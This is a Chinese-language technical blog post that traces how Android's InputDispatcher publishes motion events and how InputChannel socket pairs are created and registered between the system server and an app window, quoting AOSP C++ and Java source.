<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputDispatcher::enqueueDispatchEntryLocked</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, <span class="keyword">const</span> InputTarget* inputTarget,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int32_t</span> dispatchMode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> inputTargetFlags = inputTarget-&gt;flags;</span><br><span class="line">    <span class="keyword">if</span> (!(inputTargetFlags &amp; dispatchMode)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    inputTargetFlags = (inputTargetFlags &amp; ~InputTarget::FLAG_DISPATCH_MASK) | dispatchMode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This is a new event.</span></span><br><span class="line">    <span class="comment">// Enqueue a new dispatch entry onto the outbound queue for this connection.</span></span><br><span class="line">    DispatchEntry* dispatchEntry = <span class="keyword">new</span> DispatchEntry(eventEntry, <span class="comment">// increments ref</span></span><br><span class="line">            inputTargetFlags, inputTarget-&gt;xOffset, inputTarget-&gt;yOffset,</span><br><span class="line">            inputTarget-&gt;scaleFactor);</span><br><span class="line">...</span><br><span class="line">    <span class="comment">// Enqueue the dispatch entry.</span></span><br><span class="line">    connection-&gt;outboundQueue.enqueueAtTail(dispatchEntry);</span><br><span class="line">    traceOutboundQueueLengthLocked(connection);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>省略的代码对<code>entry</code>进行了进一步的包装，然后在最后加入到了<code>connection</code>维护的<code>outboundQueue</code>中。</p>
<p>回到上面，之后调用<code>startDispatchCycleLocked()</code>正式开始分发事件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (connection-&gt;status == Connection::STATUS_NORMAL</span><br><span class="line">          &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123;</span><br><span class="line">      DispatchEntry* dispatchEntry = connection-&gt;outboundQueue.head;</span><br><span class="line">      dispatchEntry-&gt;deliveryTime = currentTime;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Publish the event.</span></span><br><span class="line">      <span class="keyword">status_t</span> status;</span><br><span class="line">      EventEntry* eventEntry = dispatchEntry-&gt;eventEntry;</span><br><span class="line">      <span class="keyword">switch</span> (eventEntry-&gt;type) &#123;</span><br></pre></td></tr></table></figure>
<p>从<code>connection</code>的<code>outboundQueue</code>取出<code>entry</code>之后，根据事件类型的不同对事件进一步处理：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> EventEntry::TYPE_MOTION: &#123;</span><br><span class="line">           MotionEntry* motionEntry = <span class="keyword">static_cast</span>&lt;MotionEntry*&gt;(eventEntry);</span><br><span class="line"></span><br><span class="line">           PointerCoords scaledCoords[MAX_POINTERS];</span><br><span class="line">           <span class="keyword">const</span> PointerCoords* usingCoords = motionEntry-&gt;pointerCoords;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Set the X and Y offset depending on the input source.</span></span><br><span class="line">           <span class="keyword">float</span> xOffset, yOffset, scaleFactor;</span><br><span class="line">           <span class="keyword">if</span> ((motionEntry-&gt;source &amp; AINPUT_SOURCE_CLASS_POINTER)</span><br><span class="line">                   &amp;&amp; !(dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS)) &#123;</span><br><span class="line">               scaleFactor = dispatchEntry-&gt;scaleFactor;</span><br><span class="line">               xOffset = dispatchEntry-&gt;xOffset * scaleFactor;</span><br><span class="line">               yOffset = dispatchEntry-&gt;yOffset * scaleFactor;</span><br><span class="line">               <span class="keyword">if</span> (scaleFactor != <span class="number">1.0f</span>) &#123;</span><br><span class="line">                   <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; motionEntry-&gt;pointerCount; i++) &#123;</span><br><span class="line">                       scaledCoords[i] = motionEntry-&gt;pointerCoords[i];</span><br><span class="line">                       scaledCoords[i].scale(scaleFactor);</span><br><span class="line">                   &#125;</span><br><span class="line">                   usingCoords = scaledCoords;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               xOffset = <span class="number">0.0f</span>;</span><br><span class="line">               yOffset = <span class="number">0.0f</span>;</span><br><span class="line">               scaleFactor = <span class="number">1.0f</span>;</span><br><span class="line"></span><br><span class="line">               <span class="comment">// We don't want the dispatch target to know.</span></span><br><span class="line">               <span class="keyword">if</span> (dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS) &#123;</span><br><span class="line">                   <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; motionEntry-&gt;pointerCount; i++) &#123;</span><br><span class="line">                       scaledCoords[i].<span class="built_in">clear</span>();</span><br><span class="line">                   &#125;</span><br><span class="line">                   usingCoords = scaledCoords;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>在对事件的坐标进行解析（缩放）之后，进入下面的发布过程：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// Publish the motion event.</span></span><br><span class="line">    status = connection-&gt;inputPublisher.publishMotionEvent(dispatchEntry-&gt;seq,</span><br><span class="line">            motionEntry-&gt;deviceId, motionEntry-&gt;source,</span><br><span class="line">            dispatchEntry-&gt;resolvedAction, motionEntry-&gt;actionButton,</span><br><span class="line">            dispatchEntry-&gt;resolvedFlags, motionEntry-&gt;edgeFlags,</span><br><span class="line">            motionEntry-&gt;metaState, motionEntry-&gt;buttonState,</span><br><span class="line">            xOffset, yOffset, motionEntry-&gt;xPrecision, motionEntry-&gt;yPrecision,</span><br><span class="line">            motionEntry-&gt;downTime, motionEntry-&gt;eventTime,</span><br><span class="line">            motionEntry-&gt;pointerCount, motionEntry-&gt;pointerProperties,</span><br><span class="line">            usingCoords);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上调用了<code>InputPublisher</code>的<code>publishMotionEvent()</code>函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">InputMessage msg;</span><br><span class="line">msg.header.type = InputMessage::TYPE_MOTION;</span><br><span class="line">msg.body.motion.seq = seq;</span><br><span class="line">msg.body.motion.deviceId = deviceId;</span><br><span class="line">msg.body.motion.source = source;</span><br><span class="line">msg.body.motion.action = action;</span><br><span class="line">msg.body.motion.actionButton = actionButton;</span><br><span class="line">msg.body.motion.flags = flags;</span><br><span class="line">msg.body.motion.edgeFlags = edgeFlags;</span><br><span class="line">msg.body.motion.metaState = metaState;</span><br><span class="line">msg.body.motion.buttonState = buttonState;</span><br><span class="line">msg.body.motion.xOffset = xOffset;</span><br><span class="line">msg.body.motion.yOffset = yOffset;</span><br><span class="line">msg.body.motion.xPrecision = xPrecision;</span><br><span class="line">msg.body.motion.yPrecision = yPrecision;</span><br><span class="line">msg.body.motion.downTime = downTime;</span><br><span class="line">msg.body.motion.eventTime = eventTime;</span><br><span class="line">msg.body.motion.pointerCount = pointerCount;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; pointerCount; i++) &#123;</span><br><span class="line">    msg.body.motion.pointers[i].properties.copyFrom(pointerProperties[i]);</span><br><span class="line">    msg.body.motion.pointers[i].coords.copyFrom(pointerCoords[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mChannel-&gt;sendMessage(&amp;msg);</span><br></pre></td></tr></table></figure>
<p>函数里封装了一个<code>msg</code>，然后最终调用了<code>mChannel</code>的<code>sendMessage()</code>方法进行跨进程通信。</p>
<hr>
<p>现在我们到了图中的这一步：</p>
<p><img src="/images/event1_5.png" alt=""></p>
<p>我们的点击事件来到了建立的<code>socket</code>中，准备与交付给对应的<code>app</code>，我们知道每个<code>app</code>运行在自己的进程中，所以就需要使用<code>socket</code>来进行跨进程通信。</p>
<hr>
<h3 id="InputChannel连接建立过程"><a href="#InputChannel连接建立过程" class="headerlink" title="InputChannel连接建立过程"></a>InputChannel连接建立过程</h3><p>本段内容主要参考了</p>
<blockquote>
<p>  <a href="http://gityuan.com/2016/12/24/input-ui/" target="_blank" rel="noopener">Gityuan的博客</a></p>
</blockquote>
<p>详细分析及代码请移步上面链接。</p>
<p>连接的建立是在一个<code>Activity</code>启动时进行的。</p>
<p><code>Activity</code>的启动是一个比较复杂的过程，会经过<code>ActivityManagerService</code>与<code>WindowManagerService</code>的层层调用，最终到达<code>WindowManagerGlobal</code>的<code>addView()</code>方法。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addView</span><span class="params">(View view, ViewGroup.LayoutParams params,</span></span></span><br><span class="line"><span class="function"><span class="params">        Display display, Window parentWindow)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    ViewRootImpl root;</span><br><span class="line">    View panelParentView = <span class="keyword">null</span>;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    root = <span class="keyword">new</span> ViewRootImpl(view.getContext(), display);</span><br><span class="line">    ... </span><br><span class="line"></span><br><span class="line">    root.setView(view, wparams, panelParentView);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>addView</code>中，创建并初始化了一个<code>ViewRootImpl</code>对象，并调用了它的<code>setView()</code>方法。</p>
<p><code>ViewRootImpl</code>的初始化过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ViewRootImpl</span><span class="params">(Context context, Display display)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    mWindowSession = WindowManagerGlobal.getWindowSession();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们关注的是这个<code>mWindowSession</code>对象的初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IWindowSession <span class="title">getWindowSession</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (WindowManagerGlobal<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sWindowSession == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InputMethodManager imm = InputMethodManager.getInstance(); </span><br><span class="line">                IWindowManager windowManager = getWindowManagerService();</span><br><span class="line">                <span class="comment">// 获取Session对象，利用Binder机制调用系统线程的方法</span></span><br><span class="line">                sWindowSession = windowManager.openSession(</span><br><span class="line">                        <span class="keyword">new</span> IWindowSessionCallback.Stub() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimatorScaleChanged</span><span class="params">(<span class="keyword">float</span> scale)</span> </span>&#123;</span><br><span class="line">                                ValueAnimator.setDurationScale(scale);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        imm.getClient(), imm.getInputContext());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sWindowSession;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>setView()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setView</span><span class="params">(View view, WindowManager.LayoutParams attrs, View panelParentView)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 服务端过程</span></span><br><span class="line">    res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes,</span><br><span class="line">        getHostVisibility(), mDisplay.getDisplayId(),</span><br><span class="line">        mAttachInfo.mContentInsets, mAttachInfo.mStableInsets,</span><br><span class="line">        mAttachInfo.mOutsets, mInputChannel);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 客户端过程</span></span><br><span class="line">    <span class="keyword">if</span> (mInputChannel != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputEventReceiver = <span class="keyword">new</span> WindowInputEventReceiver(mInputChannel, Looper.myLooper());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的两行语句分别的对应两个注册过程的开始，先执行服务端的注册与监听，再执行客户端的注册与监听。</p>
<p>下面对这两个过程分别进行追踪。</p>
<h4 id="服务端过程"><a href="#服务端过程" class="headerlink" title="服务端过程"></a>服务端过程</h4><p>通过刚刚获取的<code>mWindowSession</code>去调用系统线程中的<code>addToDisplay()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addToDisplay</span><span class="params">(IWindow window, <span class="keyword">int</span> seq, WindowManager.LayoutParams attrs,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> viewVisibility, <span class="keyword">int</span> displayId, Rect outContentInsets, Rect outStableInsets,</span></span></span><br><span class="line"><span class="function"><span class="params">            Rect outOutsets, InputChannel outInputChannel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mService.addWindow(<span class="keyword">this</span>, window, seq, attrs, viewVisibility, displayId,</span><br><span class="line">                outContentInsets, outStableInsets, outOutsets, outInputChannel);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">这个`mService`自然就是之前获取它使用的`WindowManagerService`，调用它的`addWindow()`方法：</span><br><span class="line"></span><br><span class="line">​```java</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addWindow</span><span class="params">(Session session, IWindow client, <span class="keyword">int</span> seq,</span></span></span><br><span class="line"><span class="function"><span class="params">            WindowManager.LayoutParams attrs, <span class="keyword">int</span> viewVisibility, <span class="keyword">int</span> displayId,</span></span></span><br><span class="line"><span class="function"><span class="params">            Rect outContentInsets, Rect outStableInsets, Rect outOutsets,</span></span></span><br><span class="line"><span class="function"><span class="params">            InputChannel outInputChannel)</span> </span>&#123;</span><br><span class="line">                ...</span><br><span class="line">                WindowState win = <span class="keyword">new</span> WindowState(<span class="keyword">this</span>, session, client, token,</span><br><span class="line">                    attachedWindow, appOp[<span class="number">0</span>], seq, attrs, viewVisibility, displayContent);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">boolean</span> openInputChannels = (outInputChannel != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; (attrs.inputFeatures &amp; INPUT_FEATURE_NO_INPUT_CHANNEL) == <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span>  (openInputChannels) &#123;</span><br><span class="line">                    win.openInputChannel(outInputChannel);</span><br><span class="line">                &#125;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>我们关注的是它创建并初始化了<code>WindowState</code>对象，然后调用了它的<code>openInputChannel()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">openInputChannel</span><span class="params">(InputChannel outInputChannel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mInputChannel != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Window already has an input channel."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String name = makeInputChannelName();</span><br><span class="line">    InputChannel[] inputChannels = InputChannel.openInputChannelPair(name);</span><br><span class="line">    mInputChannel = inputChannels[<span class="number">0</span>]; <span class="comment">// 这里将服务端的inputChannel保存在了WindowState中</span></span><br><span class="line">    mClientChannel = inputChannels[<span class="number">1</span>];</span><br><span class="line">    mInputWindowHandle.inputChannel = inputChannels[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (outInputChannel != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mClientChannel.transferTo(outInputChannel);</span><br><span class="line">        mClientChannel.dispose();</span><br><span class="line">        mClientChannel = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// If the window died visible, we setup a dummy input channel, so that taps</span></span><br><span class="line">        <span class="comment">// can still detected by input monitor channel, and we can relaunch the app.</span></span><br><span class="line">        <span class="comment">// Create dummy event receiver that simply reports all events as handled.</span></span><br><span class="line">        mDeadWindowEventReceiver = <span class="keyword">new</span> DeadWindowEventReceiver(mClientChannel);</span><br><span class="line">    &#125;</span><br><span class="line">    mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里创建了两个<code>InputChannel</code>对象，其中作为服务端存放在系统进程中的是<code>inputChannels[0]</code>，作为客户端的存放在<code>app</code>的<code>ui</code>主线程中的是<code>inputChannels[1]</code>。它们的传递过程之后再看，我们先看<code>InputChannel</code>建立时调用的<code>openInputChannelPair()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> InputChannel[] openInputChannelPair(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"name must not be null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        Slog.d(TAG, <span class="string">"Opening input channel pair '"</span> + name + <span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nativeOpenInputChannelPair(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>native</code>方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jobjectArray <span class="title">android_view_InputChannel_nativeOpenInputChannelPair</span><span class="params">(JNIEnv* env,</span></span></span><br><span class="line"><span class="function"><span class="params">        jclass clazz, jstring nameObj)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    sp&lt;InputChannel&gt; serverChannel;</span><br><span class="line">    sp&lt;InputChannel&gt; clientChannel;</span><br><span class="line">    <span class="keyword">status_t</span> result = InputChannel::openInputChannelPair(name, serverChannel, clientChannel);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> channelPair;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里就分为了<code>serverChannel</code>与<code>clientChannel</code>，作为<code>openInputChannelPair</code>调用的两参数来成对地创建：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">InputChannel::openInputChannelPair</span><span class="params">(<span class="keyword">const</span> String8&amp; name,</span></span></span><br><span class="line"><span class="function"><span class="params">        sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_SEQPACKET, <span class="number">0</span>, sockets)) &#123;</span><br><span class="line">        <span class="keyword">status_t</span> result = -errno;</span><br><span class="line">        ALOGE(<span class="string">"channel '%s' ~ Could not create socket pair.  errno=%d"</span>,</span><br><span class="line">                name.<span class="built_in">string</span>(), errno);</span><br><span class="line">        outServerChannel.<span class="built_in">clear</span>();</span><br><span class="line">        outClientChannel.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> bufferSize = SOCKET_BUFFER_SIZE;</span><br><span class="line">    setsockopt(sockets[<span class="number">0</span>], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, <span class="keyword">sizeof</span>(bufferSize));</span><br><span class="line">    setsockopt(sockets[<span class="number">0</span>], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, <span class="keyword">sizeof</span>(bufferSize));</span><br><span class="line">    setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, <span class="keyword">sizeof</span>(bufferSize));</span><br><span class="line">    setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, <span class="keyword">sizeof</span>(bufferSize));</span><br><span class="line"></span><br><span class="line">    String8 serverChannelName = name;</span><br><span class="line">    serverChannelName.append(<span class="string">" (server)"</span>);</span><br><span class="line">    outServerChannel = <span class="keyword">new</span> InputChannel(serverChannelName, sockets[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    String8 clientChannelName = name;</span><br><span class="line">    clientChannelName.append(<span class="string">" (client)"</span>);</span><br><span class="line">    outClientChannel = <span class="keyword">new</span> InputChannel(clientChannelName, sockets[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到第4行使用了系统调用<code>socketpair()</code>来创建一对本地<code>socket</code>对象，使用<code>int</code>数组<code>sockets</code>来接收创建好的<code>fd</code>。</p>
<p>下面使用系统调用<code>setsockopt()</code>来为新建的<code>socket</code>进行配置，设置了<code>socket</code>实体的输入输出<code>buff</code>大小。</p>
<p>第21、25行调用了<code>Native</code> <code>InputChannel</code>的构造方法以<code>name+(server)</code>或<code>name+(client)</code>作为名字参数与创建好的<code>socket</code>作为<code>fd</code>参数来构造<code>InputChannel</code>对象，它的构造方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">InputChannel::InputChannel(<span class="keyword">const</span> String8&amp; name, <span class="keyword">int</span> fd) :</span><br><span class="line">        mName(name), mFd(fd) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG_CHANNEL_LIFECYCLE</span></span><br><span class="line">    ALOGD(<span class="string">"Input channel constructed: name='%s', fd=%d"</span>,</span><br><span class="line">            mName.<span class="built_in">string</span>(), fd);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = fcntl(mFd, F_SETFL, O_NONBLOCK);</span><br><span class="line">    LOG_ALWAYS_FATAL_IF(result != <span class="number">0</span>, <span class="string">"channel '%s' ~ Could not make socket "</span></span><br><span class="line">            <span class="string">"non-blocking.  errno=%d"</span>, mName.<span class="built_in">string</span>(), errno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将<code>name</code> <code>fd</code>保存到域中，并配置了<code>fd</code>。</p>
<p>现在我们的两个<code>InputChannel</code>（实际上是一对本地<code>socket</code>的封装）就创建好了。</p>
<p>现在我们回到<code>WindowState</code>的<code>openInputChannel()</code>方法中，在成功创建两个<code>InputChannel</code>后，调用了<code>mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerInputChannel</span><span class="params">(InputChannel inputChannel,</span></span></span><br><span class="line"><span class="function"><span class="params">        InputWindowHandle inputWindowHandle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (inputChannel == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"inputChannel must not be null."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nativeRegisterInputChannel(mPtr, inputChannel, inputWindowHandle, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nativeRegisterInputChannel</span><span class="params">(JNIEnv* env, jclass <span class="comment">/* clazz */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        jlong ptr, jobject inputChannelObj, jobject inputWindowHandleObj, jboolean monitor)</span> </span>&#123;</span><br><span class="line">    NativeInputManager* im = <span class="keyword">reinterpret_cast</span>&lt;NativeInputManager*&gt;(ptr);</span><br><span class="line"></span><br><span class="line">    sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env,</span><br><span class="line">            inputChannelObj);</span><br><span class="line">    ...</span><br><span class="line">    sp&lt;InputWindowHandle&gt; inputWindowHandle =</span><br><span class="line">            android_server_InputWindowHandle_getHandle(env, inputWindowHandleObj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">status_t</span> status = im-&gt;registerInputChannel(</span><br><span class="line">            env, inputChannel, inputWindowHandle, monitor);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">NativeInputManager::registerInputChannel</span><span class="params">(JNIEnv* <span class="comment">/* env */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;InputChannel&gt;&amp; inputChannel,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, <span class="keyword">bool</span> monitor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mInputManager-&gt;getDispatcher()-&gt;registerInputChannel(</span><br><span class="line">            inputChannel, inputWindowHandle, monitor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getDispatcher()</code>返回了<code>InputDispatcher</code>对象，这个方法就调用了我们之前提到过的<code>InputDispatcher::registerInputchannel()</code>方法，向<code>InputDispatcher</code>注册了我们创建好的<code>InputChannel</code>服务端。</p>
<p>我们回顾一下这个方法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">InputDispatcher::registerInputChannel</span><span class="params">(<span class="keyword">const</span> sp&lt;InputChannel&gt;&amp; inputChannel,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, <span class="keyword">bool</span> monitor)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        sp&lt;Connection&gt; connection = <span class="keyword">new</span> Connection(inputChannel, inputWindowHandle, monitor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = inputChannel-&gt;getFd();</span><br><span class="line">        mConnectionsByFd.add(fd, connection);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (monitor) &#123;</span><br><span class="line">            mMonitoringChannels.push(inputChannel);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLooper-&gt;addFd(fd, <span class="number">0</span>, ALOOPER_EVENT_INPUT, handleReceiveCallback, <span class="keyword">this</span>); </span><br><span class="line">    &#125; <span class="comment">// release lock</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wake the looper because some connections have changed.</span></span><br><span class="line">    mLooper-&gt;wake();</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将<code>InputChannel</code>的<code>Fd</code>作为索引保存到<code>InputDispatcher</code>中。</p>
<p>然后调用<code>mLooper</code>的<code>addFd</code>在<code>Native Looper</code>中设置自定义<code>fd</code>进行监听，传入了<code>handleReceiveCallback()</code>函数作为参数，这样一来，在服务端收到消息时就会进行回调。关于<code>Native Looper</code>处理事件的分析可见<a href="http://www.viseator.com/2017/10/22/android_event_1/">另一系列的博文</a>。</p>
<h4 id="客户端过程"><a href="#客户端过程" class="headerlink" title="客户端过程"></a>客户端过程</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 客户端过程</span></span><br><span class="line"><span class="keyword">if</span> (mInputChannel != <span class="keyword">null</span>) &#123;</span><br><span class="line">    mInputEventReceiver = <span class="keyword">new</span> WindowInputEventReceiver(mInputChannel, Looper.myLooper());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里以客户端<code>InputChannel</code>与当前应用的<code>Looper</code>作为参数，初始化了<code>WindowInputEventReceiver</code>对象：</p>
